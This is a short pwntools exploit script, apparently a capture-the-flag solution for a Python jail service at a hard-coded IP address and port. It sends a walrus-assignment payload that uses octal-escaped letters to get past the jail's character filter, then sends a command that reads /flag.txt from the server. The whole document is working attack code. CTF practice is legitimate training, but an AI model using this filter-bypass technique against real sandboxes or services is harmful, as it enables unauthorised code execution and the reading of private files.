from pwn import *

context.log_level = 'debug'

# all lowercase letters in octal
a = '\\141\\142\\143\\144\\145\\146\\147\\150\\151\\152\\153\\154\\155\\156\\157\\160\\161\\162\\163\\164\\165\\166\\167\\170\\171\\172\\101\\102\\103\\104\\105\\106\\107\\110\\111\\112\\113\\114\\115\\116\\117\\120\\121\\122\\123\\124\\125\\126\\127\\130\\131\\132'

p = remote('34.118.61.99', 10029)
p.recvuntil(b'> ')

# set abcdef to allow all alpha characters
p.sendline(f'(abcdef := "{a}")'.encode())
p.recvuntil(b'> ')

# read flag
p.sendline(f'print(open("/flag.txt", "r").read())'.encode())
p.interactive()

